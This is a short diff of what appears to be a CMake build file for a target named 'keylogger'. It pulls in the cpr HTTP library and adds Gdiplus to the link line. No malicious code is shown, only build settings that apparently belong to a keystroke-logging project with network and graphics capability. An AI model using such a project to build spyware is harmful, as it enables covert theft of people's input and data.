@@ -26,4 +26,4 @@ FetchContent_Declare(cpr GIT_REPOSITORY https://github.com/libcpr/cpr.git
 FetchContent_MakeAvailable(cpr)
 
 
-target_link_libraries(keylogger PRIVATE cpr::cpr)
+target_link_libraries(keylogger PRIVATE cpr::cpr Gdiplus)
